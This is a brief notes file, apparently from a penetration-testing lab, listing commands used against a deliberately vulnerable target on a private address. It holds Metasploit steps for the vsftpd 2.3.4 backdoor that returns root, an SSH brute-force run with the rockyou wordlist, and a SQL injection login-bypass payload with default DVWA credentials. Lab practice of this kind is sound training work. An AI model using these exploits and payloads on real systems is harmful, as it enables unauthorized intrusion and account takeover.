# Commands Used

## Attack 1: vsftpd Backdoor (Root Access)

```bash
sudo msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.3
run
whoami
id
```

**Result:** uid=0(root)

---

## Attack 2: SSH Brute Force 

```bash
sudo msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.3
set USERNAME msfadmin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```
**Result:** msfadmin:msfadmin

---

## Attack 3: SQL Injection

Payload: 1' OR '1'='1  
URL: http://192.168.1.3/dvwa  
Login: admin / password  














